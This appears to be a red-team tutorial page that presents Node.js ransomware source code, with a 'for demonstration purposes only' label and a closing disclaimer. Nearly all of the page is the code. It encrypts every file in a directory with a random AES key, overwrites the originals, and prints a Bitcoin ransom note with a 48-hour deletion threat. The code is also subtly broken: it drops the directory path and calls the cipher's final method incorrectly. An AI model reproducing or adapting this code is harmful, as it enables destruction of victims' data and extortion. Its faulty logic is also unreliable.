# Ransomware code in JavaScript
##### RedTeam - Technics
(for-demonstration-purposes-only to understand the technic behind.
Ransomware code (for demonstration purposes only)

```
// Ransomware code (for demonstration purposes only)
var fs = require('fs');
var crypto = require('crypto');

// Directory to target for file encryption
var targetDirectory = '/user/files';

// Generate encryption key
var encryptionKey = crypto.randomBytes(32).toString('hex');

// Read all files in the target directory
fs.readdirSync(targetDirectory).forEach(file => {
  // Skip directories
  if (fs.lstatSync(file).isDirectory()) return;

  // Read file data
  var data = fs.readFileSync(file);

  // Encrypt file data with encryption key
  var encryptedData = crypto
    .createCipher('aes-256-cbc', encryptionKey)
    .update(data, 'utf8', 'hex') +
    crypto.createCipher.final('hex');

  // Write encrypted data back to file
  fs.writeFileSync(file, encryptedData);
});

// Display ransom note to user
var ransomNote = `
Your files have been encrypted!
To decrypt your files, send 0.1 BTC to the following address:
<Bitcoin_Address>
Once payment is received, your files will be decrypted.
If payment is not made within 48 hours, the encryption key will be deleted, and your files will be lost forever.
`;

console.log(ransomNote);

```
Please note that creating or using ransomware is illegal and unethical. It is important to always abide by the law and use technology responsibly and ethically to promote positive outcomes for society.
